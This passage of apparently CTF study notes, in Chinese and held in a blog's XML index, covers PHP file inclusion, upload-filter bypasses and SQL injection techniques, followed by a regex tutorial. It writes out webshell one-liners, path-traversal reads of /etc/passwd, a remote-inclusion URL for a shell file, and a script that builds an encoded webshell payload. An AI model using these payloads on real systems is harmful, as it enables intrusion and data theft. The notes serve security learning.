&#39;[[){,?[&#39;;$_()//payload为：code=$_=&#39;&lt;&gt;]=@^&lt;&#39;^&#39;[[){,?[&#39;;$_();</code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含</title>
      <link href="/2020/03/26/wen-jian-bao-han/"/>
      <url>/2020/03/26/wen-jian-bao-han/</url>
      
        <content type="html"><![CDATA[<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><h4 id="1-原理"><a href="#1-原理" class="headerlink" title="1.原理"></a>1.原理</h4><ul><li>类似于C语言中的include，python中的import</li><li><code>index.php?page=aaaa&amp;func=bbb</code></li></ul><h4 id="2-相关函数"><a href="#2-相关函数" class="headerlink" title="2.相关函数"></a>2.相关函数</h4><ul><li>include()：如果包含的文件不存在，报错后继续执行后面的代码</li><li>include_once()：在include的基础上限定只包含一个</li><li>require()：如果后面的文件不存在，报错后不执行后面的代码</li><li>require_once()：在require的基础上限定只包含一个</li></ul><h4 id="3-分类"><a href="#3-分类" class="headerlink" title="3.分类"></a>3.分类</h4><ul><li>远程文件包含<ul><li>比较危险。默认不开启</li><li><code>[http|https|ftp]://www.bbb.com/shell.txt</code></li><li>如果后缀名写死，可使用？绕过<ul><li>在包含文件后添加?a等字符就可以，不会造成影响，因为?后的字符被当做参数传递</li></ul></li></ul></li><li>本地文件包含</li></ul><h4 id="4-不限制文件"><a href="#4-不限制文件" class="headerlink" title="4.不限制文件"></a>4.不限制文件</h4><ul><li>只要文件中包含PHP代码，就可以。<ul><li>或者是<code>&lt;script language=&#39;php&#39;&gt; @eval($_POST[‘cmd’]);&lt;/script&gt;</code></li></ul></li><li>文件可以为jpg、png、xxxx等</li></ul><h4 id="5-重点"><a href="#5-重点" class="headerlink" title="5.重点"></a>5.重点</h4><p>找到可控文件</p><ul><li>可以上传可控文件</li><li>file=/etc/passwd</li><li>file=../../../etc/passwd</li><li>file=source.php?../../../../../flag</li></ul><h4 id="6-伪协议"><a href="#6-伪协议" class="headerlink" title="6.伪协议"></a>6.伪协议</h4><ul><li><code>file://    http://    ftp://    php://  （io流）  zlib:// (压缩流) bzip://    zip://  data://    glob://    phar://  （PHP归档）  ssh2://    rar://    ogg://  （音频流）  expect://（交互式流）</code>    </li><li>file=<code>zip://xxxx.zip#xxxx.php</code></li><li>file=<code>phar://xxxx.zip/xxxx.php</code> </li><li>file=<code>php://filter/convert.base64-encode/resource=index.php</code>  //可以实现读取源文件的功能</li><li>file=<code>php://input/</code>（受限于allow_url_fopen）这个协议可以传入数据</li><li>phar的生成方法：将写好的phpinfo.php添加到压缩包(test.zip)中，修改压缩包后缀即可<ul><li>访问压缩包中的文件的方法：phar://the-path/test.zip/phpinfo.php</li></ul></li></ul><h4 id="7-具体场景——日志文件"><a href="#7-具体场景——日志文件" class="headerlink" title="7.具体场景——日志文件"></a>7.具体场景——日志文件</h4><ul><li>把php代码放在日志里，然后去读取日志</li></ul><h4 id="8-具体场景——session"><a href="#8-具体场景——session" class="headerlink" title="8.具体场景——session"></a>8.具体场景——session</h4><ul><li><p>session文件默认放在/tmp下，PHP代码写到session里，读取session</p></li><li><p>这个参数在<code>php.ini</code>默认开启,需要手动置为Off ，如果不是Off ，就会在上传的过程中生成<strong>上传进度文件（该文件可控）</strong>，它的存储路径可以在phpinfo获取到</p><ul><li>PHPinfo中获取该问价路径：/var/lib/php5/sess_{your_php_session_id}</li></ul></li><li><p>base64 中的==，可有可没有，在PHP中不重要，所以，可使用base64让字符消失（单个字母解释为空）</p></li><li><p>可以尝试多次base64解码（3次），消除字符</p></li><li><p>思路：因为上传过程中会生成<strong>进度文件</strong>，但是在上传结束后会删除进度文件，所以在这个极小的时间内，控制这个进度文件的内容（让其生成一句话木马），使用爆破模块一直上传（增加时间），使用爆破模块通过文件包含访问这个进度文件（知道文件的位置），使其在极短时间内生成一句话。（控制进度文件的方法，可以使用PHP://filter//这个伪协议，通过多次base64解码，去掉不想要的内容）</p></li><li><pre class=" language-php"><code class="language-php"><span class="token shell-comment comment">#构造base64解密的密文，去掉不想要的内容</span><span class="token delimiter">&lt;?php</span><span class="token variable">$perfix</span> <span class="token operator">=</span> <span class="token string">'upload_progress_'</span> <span class="token punctuation">;</span><span class="token variable">$word</span> <span class="token operator">=</span><span class="token string">"abcdefghijkLmnopqrstuvwxy zABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/"</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">64</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$data1</span> <span class="token operator">=</span> <span class="token variable">$perfix</span><span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$word</span><span class="token punctuation">,</span><span class="token variable">$i</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">&lt;</span> <span class="token number">64</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$data1</span><span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$word</span><span class="token punctuation">,</span><span class="token variable">$j</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token shell-comment comment">#echo $data </span>                    <span class="token variable">$result</span> <span class="token operator">=</span> preg_ <span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'|[^a-z0-9A-Z+/]|s'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                <span class="token shell-comment comment">#echo $data.</span><span class="token string">"\n"</span> <span class="token punctuation">;</span>                                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'|[^a-z0-9A-Z+/]|s'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span>                                <span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token variable">$data</span><span class="token punctuation">.</span><span class="token string">"\n"</span> <span class="token punctuation">;</span><span class="token punctuation">}</span>                    <span class="token punctuation">}</span>            <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre></li></ul><ul><li><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#进度文件的内容，使其不包含“=”等其他东西</span><span class="token keyword">import</span> string<span class="token keyword">from</span> random <span class="token keyword">import</span> sample<span class="token punctuation">,</span> randint<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64encodepayload <span class="token operator">=</span> <span class="token string">"@&lt;?php file_put_contents( '/tmp/web', '@&lt;?php eval('$_POST[1])?>');?>"</span><span class="token keyword">while</span> <span class="token number">1</span> <span class="token punctuation">:</span>    junk <span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>sample<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_letters<span class="token punctuation">,</span>randint<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    x <span class="token operator">=</span> b64encode<span class="token punctuation">(</span> payload <span class="token operator">+</span> junk<span class="token punctuation">)</span>    XX <span class="token operator">=</span> b64encode<span class="token punctuation">(</span> b64encode<span class="token punctuation">(</span> payload <span class="token operator">+</span> junk<span class="token punctuation">)</span><span class="token punctuation">)</span>    XXX <span class="token operator">=</span> b64encode <span class="token punctuation">(</span> b64encode <span class="token punctuation">(</span> b64encode<span class="token punctuation">(</span>payload <span class="token operator">+</span> junk<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'='</span> <span class="token operator">not</span> <span class="token keyword">in</span> X <span class="token operator">and</span> <span class="token string">'='</span> <span class="token operator">not</span> <span class="token keyword">in</span> XX <span class="token operator">and</span> <span class="token string">'='</span> <span class="token operator">not</span> <span class="token keyword">in</span> XXX<span class="token punctuation">:</span>        <span class="token keyword">print</span> XXX        brea k</code></pre></li></ul><h4 id="9-具体场景——session"><a href="#9-具体场景——session" class="headerlink" title="9.具体场景——session"></a>9.具体场景——session</h4><ul><li><p>知道文件的位置，并包含那个session文件，</p></li><li><p>php生成的session文件默认放在/tmp目录下（或者在PHPinfo的页面中找到），结构为<code>sess_{session_id}</code></p></li><li><p>session可控的场景（部分注册的题目）</p></li><li><p>在哪个页面打开PHPinfo，就会显示当前页的session和一些设置</p></li><li><p>文件包含： <code>?file=phpinfo.php 或 ?file=../../../../tmp/sess_{sessin_id} 或 ?file=php://filter/convert.base64-encode/resource=index.php</code> </p></li></ul><h4 id="10-具体场景——远古魔法"><a href="#10-具体场景——远古魔法" class="headerlink" title="10.具体场景——远古魔法"></a>10.具体场景——远古魔法</h4><ul><li><p>%00截断：需要magic quotes. gpc=off , PHP小于5.3.4有效(?)</p></li><li><p>路径长度截断:</p><ul><li>./和.  (php版本小于5.2.8(?)可以成功, linux需要文件名长于4096 , windows需要长于256)</li></ul></li></ul><h4 id="11-具体场景——PHPinfo"><a href="#11-具体场景——PHPinfo" class="headerlink" title="11.具体场景——PHPinfo"></a>11.具体场景——PHPinfo</h4><ul><li>向服务器上任意 php 文件以 form-data 方式提交请求上传数据时，会生成临时文件，通过phpinfo来获取临时文件的路径以及名称，然后临时文件在极短时间被删除的时候，需要竞争时间包含临时文件拿到webshell</li><li>对任何的PHP文件，去上传文件，然后服务器生成一个临时文件，服务器对临时进行判断，符合就留下，不符合就删除，在此之间会有一段时间，利用这段检测的时间（上传成功后，检测删除前），访问上传的文件，生成一句话</li></ul><h4 id="12-具体环境——自包含导致爆栈"><a href="#12-具体环境——自包含导致爆栈" class="headerlink" title="12.具体环境——自包含导致爆栈"></a>12.具体环境——自包含导致爆栈</h4><ul><li>/a. php?include=a. php</li><li>这样a.php会将它本身包含进来，而被包含进来的a.php再次尝试处理url的包含请求时，再次将自己包含进来，形成了无穷递归，递归会导致爆栈</li><li>爆栈后，不会去执行删除的那个命令（语句、功能），所以就跳过了文件上传后检测删除的那个步骤</li><li>此时  通过PHP规则进行爆破，得到上传的文件的临时文件名</li><li>然后就能包含了</li></ul><h4 id="13-具体场景——PHP崩溃"><a href="#13-具体场景——PHP崩溃" class="headerlink" title="13.具体场景——PHP崩溃"></a>13.具体场景——PHP崩溃</h4><ul><li>本地文件包含漏洞可以让php包含自身从而导致死循环，然后php就会崩溃,如果请求中同时存在一个上传文件的请求的话，这个文件就会被保留<br>include.php?file= php://filter/string.strip _tags/resource=/etc/passwd</li></ul>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传</title>
      <link href="/2020/03/26/wen-jian-shang-chuan/"/>
      <url>/2020/03/26/wen-jian-shang-chuan/</url>
      
        <content type="html"><![CDATA[<h3 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h3><h4 id="1-客户端校验（本地）——JavaScript校验"><a href="#1-客户端校验（本地）——JavaScript校验" class="headerlink" title="1. 客户端校验（本地）——JavaScript校验"></a>1. 客户端校验（本地）——JavaScript校验</h4><ul><li><p>原理：本地JavaScript进行校验</p></li><li><p>绕过方法：</p><ul><li>1.抓包解包 </li><li>2.禁用JavaScript</li></ul></li></ul><h4 id="2-服务器端校验——content-type校验"><a href="#2-服务器端校验——content-type校验" class="headerlink" title="2.服务器端校验——content-type校验"></a>2.服务器端校验——content-type校验</h4><ul><li>原理：MIME类型检测</li><li>绕过方法：<ul><li>1.修改数据包<ul><li><code>gif——image/gif</code> </li><li><code>png——image/png</code></li><li><code>jpg——image/jpeg</code></li><li><code>js ——text/javascript</code></li><li><code>htm——text/html</code></li><li><code>html——text/html</code></li></ul></li><li>2.改文件名后上传抓包后再改回文件名</li><li>3.上传正常文件修改文件内容</li><li>目的：构造包使content-type 正确</li></ul></li></ul><h4 id="3-服务端校验——后缀名黑名单校验"><a href="#3-服务端校验——后缀名黑名单校验" class="headerlink" title="3.服务端校验——后缀名黑名单校验"></a>3.服务端校验——后缀名黑名单校验</h4><ul><li>原理：开发人员禁止了某些后缀名</li><li>绕过：<ul><li>1.大小写绕过，例如：Php、PhP</li><li>2.利用黑名单没有的，但是能被中间件解析的后缀名，例如：PHP、php3、php4、php5、pht、php7、phtml、phps </li><li><strong><code>Apache的配置文件正则规则   .+\.ph(p[3457]?|t|tml)$</code></strong></li><li>3.上传Apache的.htaccess 文件 ，与php文件在同一目录<ul><li><code>&lt;FilesMatch &quot;php7.jpg&quot;&gt;sethandler application/x-httpd-php&lt;/FilesMatch&gt;</code> </li></ul></li><li>4.使用00截断：使用bp的hex修改0x00<ul><li>基于一个组合逻辑漏洞造成的，通常存在于构造上传文件路径的时候</li></ul></li><li>5.超长文件名截断上传Windows： 258 byte Linux： 4096 byte</li></ul></li></ul><h4 id="4-服务端校验——后缀名白名单校验"><a href="#4-服务端校验——后缀名白名单校验" class="headerlink" title="4.服务端校验——后缀名白名单校验"></a>4.服务端校验——后缀名白名单校验</h4><ul><li>原理：猜测是因为Apache服务器识别文件名时是从后向前推</li></ul><h4 id="5-服务端校验——内容头校验"><a href="#5-服务端校验——内容头校验" class="headerlink" title="5.服务端校验——内容头校验"></a>5.服务端校验——内容头校验</h4><ul><li>原理：文件头  <code>getimagesize()</code></li><li>绕过：gif89a<?php phpinfo();?></li></ul><h4 id="6-竞争上传"><a href="#6-竞争上传" class="headerlink" title="6.竞争上传"></a>6.竞争上传</h4><ul><li>情景：<strong>文件上传</strong>后，检测是否合法，不合法就删除，所以意味着文件在服务器上存在过，只是存在时间短，理论上是能访问的。</li><li>绕过：使用爆破，一直发，访问速度大于他的删除速度。生成小文件。。。</li><li>趁代码不注意，赶紧访问！！！</li></ul><p>上传文件代码：</p><pre><code>&lt;html&gt;  &lt;body&gt;      &lt;form action=&quot;upload-file.php&quot; method=&quot;post&quot;          enctype=&quot;multipart/form-data&quot;&gt;          &lt;label for=&quot;file&quot;&gt;文件名:&lt;/label&gt;          &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt;          &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot; /&gt;      &lt;/form&gt;  &lt;/body&gt;  &lt;/html&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 文件长传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入</title>
      <link href="/2020/03/26/sql-zhu-ru/"/>
      <url>/2020/03/26/sql-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h3 id="SQL注入系列"><a href="#SQL注入系列" class="headerlink" title="SQL注入系列"></a>SQL注入系列</h3><p>控制那些我们能控制的字段，将其写为SQL语句，使其执行，得到我们想要的信息</p><h4 id="1-常用编码及绕过"><a href="#1-常用编码及绕过" class="headerlink" title="1.常用编码及绕过"></a>1.常用编码及绕过</h4><ul><li><p>ASCII编码</p></li><li><p>GBK编码</p></li><li><p>URL转码（常用）</p><ul><li><code>空格</code>                   %20</li><li><code>‘</code>（单引号） %27</li><li><code>#</code>                     %23</li><li><code>\</code>                     %5C               </li></ul></li><li><p>逃逸方法常用注释：</p><ul><li><code>#  %23</code>   </li><li><code>--(空格)</code></li><li><code>;%00</code> ‘%00</li><li>将函数名放到username，函数括号及内容放到password中，将username与password之间其他的字符用<code>/*….*/</code>进行注释，使其构成完整的函数。<ul><li>例如：<code>username=&#39;and updatexml /* password=*/()</code></li></ul></li><li></li></ul></li><li><p>替代 <code>=(等号)</code>方法：</p><ul><li><code>rlike</code></li><li><code>!(a&lt;&gt;b)</code></li><li><code>!!=</code></li><li>正则表达式：<code>regexp</code>（SQL中的正则表达式）</li></ul></li><li><p>查询结果大于一行，可以将所有的行使用group concat()拼接起来</p></li><li><p>判断字符相等时可以替换为ASCII码进行替换，避免了使用<code>‘’</code>单引号</p></li><li><p>替换  <code>and</code>，使用  <code>+</code></p></li><li><p>替换<code>空格</code>用内联注释<code>/**/</code>  </p></li><li><p>如果不能使用 <code>table= ‘table_name’</code>，即单引号不能在SQL构造中使用，则可修改为 <code>table = 0x...</code>(即使用十六进制) </p></li><li><p>绕过引号限制</p><p>– hex 编码<br>SELECT * FROM Users WHERE username = 0x61646D696E<br>– char() 函数<br>SELECT * FROM Users WHERE username = CHAR(97, 100, 109, 105, 110)</p></li><li><p>绕过字符串黑名单</p><p>SELECT ‘a’ ‘d’ ‘mi’ ‘n’;</p><p>SELECT CONCAT(‘a’, ‘d’, ‘m’, ‘i’, ‘n’);</p><p>SELECT CONCAT_WS(‘’, ‘a’, ‘d’, ‘m’, ‘i’, ‘n’);</p><p>SELECT GROUP_CONCAT(‘a’, ‘d’, ‘m’, ‘i’, ‘n’);</p><p>使用 <code>CONCAT()</code> 时，任何个参数为 null，将返回 null，推荐使用 <code>CONCAT_WS()</code>。<code>CONCAT_WS()</code> 函数第一</p><p>个参数表示用哪个字符间隔所查询的结果</p></li></ul><h4 id="2-宽字节注入"><a href="#2-宽字节注入" class="headerlink" title="2.宽字节注入"></a>2.宽字节注入</h4><ul><li>原理：宽字节注入是利用MySQL的一个特性，MySQL在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ASCII码要大于128（%F7），才到汉字的范围），这样使 <code>‘</code>（单引号）逃逸。</li><li><code>‘输入的内容’</code> = = &gt; <code>‘输入的内容 ’ 查询的代码 #’</code>  ：在输入时添加单引号，将前面的  左单引号  进行闭合，然后后面跟上自己的SQL查询代码，在加上<code>#</code>将后面的  右单引号  注释掉，这样可以执行自己的SQL查询指令了</li></ul><p><img src="https://gitee.com/lingying177/blogimage/raw/master/img/CTF/SQL%E6%B3%A8%E5%85%A52.png" alt=""></p><h4 id="3-基于约束的SQL攻击"><a href="#3-基于约束的SQL攻击" class="headerlink" title="3.基于约束的SQL攻击"></a>3.基于约束的SQL攻击</h4><ul><li><p>原理：数据库中的表段有字符长度限制，超出长度的数据会被截取丢掉。假设用户名要求30个字符长度，如果我插入一个  <code>admin          （包含空格使数据大于30位）              1</code>，则，在向数据库插入用户时，会截取  <code>admin与前25个空格</code>插入数据库（实质为插入了admin，因为空格会默认删除，不能插入），所以控制了admin账户与密码。</p></li><li><p>注意多打一些空格，超出数据库的限制</p></li></ul><h4 id="4-报错注入"><a href="#4-报错注入" class="headerlink" title="4.报错注入"></a>4.报错注入</h4><ul><li>原理：（测试时提示语法错误，则可尝试）利用group by的查询特点，即，查询后生成的表中关键字不能相同，但如果使用 <code>group by  concat(user(),floor(rand(0)*2))</code>会生成  <code>0或1</code>两种<strong>随机</strong>结果，在进行虚拟表的查询和生成时，造成多次插入相同关键字的错误，然后报出。(PPT放在image文件夹中)。</li></ul><img src="https://gitee.com/lingying177/blogimage/raw/master/img/CTF/sql注入.png" style="zoom:50%;" /><h4 id="5-基于时间的盲注"><a href="#5-基于时间的盲注" class="headerlink" title="5.基于时间的盲注"></a>5.基于时间的盲注</h4><ul><li>原理：sleep()函数，通过<code>IF(exp1,exp2,exp3)</code>、<code>select case when xx then xx else xx end;</code>、配合<ul><li><code>sleep(n)</code></li><li><code>substr(字符串,开始位置,截取长度)</code></li><li><code>substring(    from   for)（可以替换逗号）</code></li><li><code>benchmark(10000000,sha(1))</code></li><li><code>笛卡尔积</code></li><li><code>GET_LOCK(str,1)</code>  </li><li><code>构造长字符串匹配</code>  </li><li>进行报数据，使用上述函数，进行遍历</li></ul></li><li>因为这些函数没法报出数据，没法显示，所以使用延时等现象让我们知道这条语句执行了或那个字符识别了<ul><li><code>if(substr(select username from user where id = 1 ,1 ,1)=&#39;a&#39;,sleep(3),0)</code>：如果从user表查询到的数据的第一个字符为a，则执行sleep函数（睡眠3秒），否者就报出0。如果引号不能使用，可以将substr截取的结果进行ASCII转换，则a可以换成97这种ASCII码值。</li><li><code>select case when username = ‘admin’ then ‘admin’ else ‘xxxx’ end from user;</code></li></ul></li></ul><h4 id="6-报错注入的盲注"><a href="#6-报错注入的盲注" class="headerlink" title="6.报错注入的盲注"></a>6.报错注入的盲注</h4><ul><li><p>相关文章</p><ul><li><a href="https://xz.aliyun.com/t/253/" target="_blank" rel="noopener">https://xz.aliyun.com/t/253/</a>  </li><li><a href="https://blog.csdn.net/qq_36628940/article/details/101000959" target="_blank" rel="noopener">https://blog.csdn.net/qq_36628940/article/details/101000959</a></li><li><a href="https://blog.csdn.net/he_and/article/details/80455884" target="_blank" rel="noopener">https://blog.csdn.net/he_and/article/details/80455884</a></li></ul></li><li><p>insert插入数据时，会自动计算引入的量，即，会执行一些语句，因为插入没有回显，所以可使用基于时间的注入进行显示</p></li><li><p>通过捕获异常，进行显示和拼接</p></li></ul><h4 id="7-bool-型盲注"><a href="#7-bool-型盲注" class="headerlink" title="7.bool 型盲注"></a>7.bool 型盲注</h4><ul><li><p>截取函数（substr）、left()、mid()、</p></li><li><p>转化函数：ASCII()、ord()</p></li><li><p>审计源码，发现在某一处位置有bool值判断（一般是多层判断），此时，我们在第一层判断的地方进行构造SQL语句（例如查询密码，截断）进行判断，如果判断正确，就是值为1，则第一层判断通过，所以此时会显示第二层的else错误，（没有显示第一层的else，说明第一层的那个判断处真值为1，也就说明我们的SQL语句查询判断结果正确。</p></li></ul><h4 id="8-order-by"><a href="#8-order-by" class="headerlink" title="8.order by"></a>8.order by</h4><ul><li>order by 能返回错误信息时，尝试使用报错注入（后面跟函数）</li><li>使用  <code>|</code>  <code>&amp;</code>  <code>^</code>  <code>~</code>  <code>&lt;&lt;</code> <code>&gt;&gt;</code>  等位运算符</li><li>类似于<code>select * from user order by  id|(if(1,2,3))+1</code>if运算返回结果加1后为  2  ，然后与1所返回的界面进行对比，判断盲注结果</li><li>注意：如果union前的语句用小括号括起来了，那么，union后的语句跟什么都可以</li></ul><h4 id="9-insert、update、delete注入"><a href="#9-insert、update、delete注入" class="headerlink" title="9.insert、update、delete注入"></a>9.insert、update、delete注入</h4><ul><li>通过控制自定义的参数位置，进行SQL注入</li><li>一定要多测试多测试</li></ul><h4 id="10-desc相关注入"><a href="#10-desc相关注入" class="headerlink" title="10.desc相关注入"></a>10.desc相关注入</h4><ul><li>desc语法：<code>desc table column</code>，可控参数有两个（desc后不能跟其他的语句）所以通过控制那两个参数进行SQL语句构造  </li></ul><h4 id="11-万能密码"><a href="#11-万能密码" class="headerlink" title="11.万能密码"></a>11.万能密码</h4><ul><li><p>常用：</p><ul><li>admin’ #</li><li>‘+’</li><li>‘+’</li><li>0</li><li>Aaa’=’</li><li>\N</li></ul></li><li><p>原理：<br>单引号闭合，井号注释</p><p><strong>select * from admin where username=’admin’ #</strong>‘ and password =’’</p><p>Mysql里select ‘aaaaa’+1 返回的是1，会把单引号里面的当成0<br><strong>select * from admin where username=’’+’’ and password =’’+’’</strong><br><strong>select * from admin where username=0 and password =0</strong></p><p>都可以爆出数据</p><p>先username=Aaa为假，再与’ ‘比较为真<br><strong>select * from admin where username=’Aaa’=’’ and password =’Aaa’=’’</strong></p></li></ul><p>  sql注入相关文件:<a href="https://www.yuque.com/attachments/yuque/0/2019/txt/376509/1563238369225-cf11ab95-d1b3-48e9-9211-e277f3985038.txt?_lake_card=%7B%22uid%22%3A%221563238369116-0%22%2C%22src%22%3A%22https%3A%2F%2Fwww.yuque.com%2Fattachments%2Fyuque%2F0%2F2019%2Ftxt%2F376509%2F1563238369225-cf11ab95-d1b3-48e9-9211-e277f3985038.txt%22%2C%22name%22%3A%22A1-SQL%E6%B3%A8%E5%85%A5.txt%22%2C%22size%22%3A4612%2C%22type%22%3A%22text%2Fplain%22%2C%22ext%22%3A%22txt%22%2C%22progress%22%3A%7B%22percent%22%3A0%7D%2C%22status%22%3A%22done%22%2C%22percent%22%3A0%2C%22id%22%3A%22IuS9W%22%2C%22card%22%3A%22file%22%7D" target="_blank" rel="noopener">A1-SQL注入.txt</a> </p><p>  各数据库注入相关:<a href="https://www.netsparker.com/" target="_blank" rel="noopener">https://www.netsparker.com/</a></p><h4 id="12-导入导出文件漏洞"><a href="#12-导入导出文件漏洞" class="headerlink" title="12. 导入导出文件漏洞"></a>12. 导入导出文件漏洞</h4><ul><li>常用路径： <a href="https://www.cnblogs.com/lcamry/p/5729087.html" target="_blank" rel="noopener">https://www.cnblogs.com/lcamry/p/5729087.html</a> </li></ul>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>正则表达式</title>
      <link href="/2020/03/26/zheng-ze-biao-da-shi/"/>
      <url>/2020/03/26/zheng-ze-biao-da-shi/</url>
      
        <content type="html"><![CDATA[<h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><h4 id="1-基础正则："><a href="#1-基础正则：" class="headerlink" title="1.基础正则："></a>1.基础正则：</h4><ul><li>作用：搜索文本</li><li>本质：学习各种的元字符并记住这些元字符的含义</li><li>编程语言支持高级正则表达式</li><li>grep 、 sed 、 awk 、 文本编辑器 、 ide </li><li><a href="https://gitlab.com/javallone/regexper-static" target="_blank" rel="noopener">https://gitlab.com/javallone/regexper-static</a> 在线正则解析</li></ul><h4 id="2-搜索字符的三种方式："><a href="#2-搜索字符的三种方式：" class="headerlink" title="2.搜索字符的三种方式："></a>2.搜索字符的三种方式：</h4><ul><li><p>精确搜索：输入具体内容</p></li><li><p>通配符搜索 ：</p><p><code>sql中：  ‘%  _   []  [^]’  例如： 我_  我%</code> </p></li><li><p>正则表达式搜索：</p><ul><li>元字符：预定义好的具有特殊含义的符号，这些符号能够进行通配</li><li>可读性非常差</li><li>写正则表达式不难</li></ul><p>精确搜索效率最高。正则表达式的效率低（仅在精确度方面比较）</p></li></ul><h4 id="3-正则表达式分类："><a href="#3-正则表达式分类：" class="headerlink" title="3.正则表达式分类："></a>3.正则表达式分类：</h4><ul><li>基础正则表达式（BRE）</li><li>扩展正则表达式（ERE）</li><li>编程语言支持的高级正则表达式</li></ul><p>BRE和ERE语法基本一致，只有部分元字符（预定义好的带有特殊含义的一些符号）需要区别对待</p><ul><li>扩展正则表达式中这些字符可以直接使用：</li></ul><p><code>?  、+  、{  、}  、|  、(、)</code></p><ul><li>基础正则表达式中这些元字符需要加反斜线转义：</li></ul><p><code>\?  \+  \{  \}  \|  \( 和 \)</code></p><blockquote><p>grep  sed  默认使用正则表达式</p><p>grep  -E   、sed  -r    、egrep   、awk   默认使用扩展正则表达式</p></blockquote><ul><li><p>grep  基本使用：</p><pre><code># grep  -E  &#39;pattern&#39;  filename     //建议设置grep的别名为grep --color=always  -E //建议设置grep的环境变量：$GREP_COLORS为&#39;ms=38;5;214;48;5;30&#39;# cmd  |  grep  -E  &#39;pattern&#39;   //(cmd:命令，从命令传入的数据)# pattern :正则表达式位置# 基础正则echo  &quot;hello world &quot;  |  grep  &#39;[a-z]\+&#39;echo  &quot;hello world &quot;  |  grep  &#39;\([a-z]\+\)d&#39;# 扩展正则echo  &quot;hello world&quot;  | grep -E &#39;[a-z]+&#39;echo  &quot;hello world&quot;  | grep -E &#39;([a-z]+)d&#39;</code></pre></li></ul><h4 id="4-纯普通字符匹配"><a href="#4-纯普通字符匹配" class="headerlink" title="4.纯普通字符匹配"></a>4.纯普通字符匹配</h4><p>普通字符的匹配模式相当于是精确匹配：</p><p><code>echo  &quot;hello world &quot;  |  grep  &#39;world&#39;</code></p><h4 id="5-基本的正则元字符"><a href="#5-基本的正则元字符" class="headerlink" title="5.基本的正则元字符"></a>5.基本的正则元字符</h4><h5 id="5-1匹配字符"><a href="#5-1匹配字符" class="headerlink" title="5.1匹配字符"></a>5.1匹配字符</h5><ul><li>abc ： 匹配字符串  “abc” ，普通字符的匹配</li><li>[abcde…z]  ：匹配括号内的任意<strong>单个</strong>字符 (中括号中的字符只匹配成功一次)<ul><li>a[xyz]b  ：能匹配axb、ayb 、azb ，不能匹配aab ，amb（因为a与m都不在中括号中）</li></ul></li><li>\n  ：匹配换行符</li><li>\t    ：匹配制表符</li><li>\w  ：匹配单词字符<code>[A-Za-z0-9_]</code></li><li>\W ：匹配非单词字符<code>[^A-Za-z0-9_]</code></li><li>\s   ：匹配空白字符</li><li>\S   ：匹配非空白字符</li><li>\d   ：匹配数字</li><li>\D  